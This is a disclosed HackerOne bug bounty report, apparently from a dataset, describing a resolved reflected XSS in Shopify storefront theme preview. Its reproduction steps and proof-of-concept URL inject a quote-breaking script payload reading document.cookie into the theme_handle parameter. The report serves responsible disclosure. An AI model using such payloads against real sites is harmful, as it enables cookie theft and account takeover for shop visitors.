---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '226428'
original_report_id: '226428'
title: Reflected XSS in <any>.myshopify.com through theme preview
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: shopify
created_at: '2017-05-05T21:22:15.520Z'
disclosed_at: '2017-05-29T16:06:44.441Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 69
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS in <any>.myshopify.com through theme preview

## Metadata

- HackerOne Report ID: 226428
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: shopify
- Disclosed At: 2017-05-29T16:06:44.441Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi,
I have found a reflected cross site scripting vulnerability in `<any>.myshopify.com` through `theme_hanlde` parameter due to not single quotes.

#Steps to reproduce: 
1. Navigate to `<account>.myshopify.com` 
2. view the source of the page and copy the value of `Shopify.theme` Id.
3. Navigate to `https://echo.myshopify.com/?theme_handle=xx%27-alert(document.cookie)-%27&style_id=1&style_handle=1&preview_theme_id=<theme_ID>` 
> *replace `<theme_ID>` with the ID you just copied*.
4. XSS will trigger in all of the online shop pages unless you click `Cancel theme preview` .

**PoC:** 
`https://test.myshopify.com/?theme_handle=xx%27-alert(document.cookie)-%27&style_id=1&style_handle=1&preview_theme_id=3572` 

{F182252}
Thanks!

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
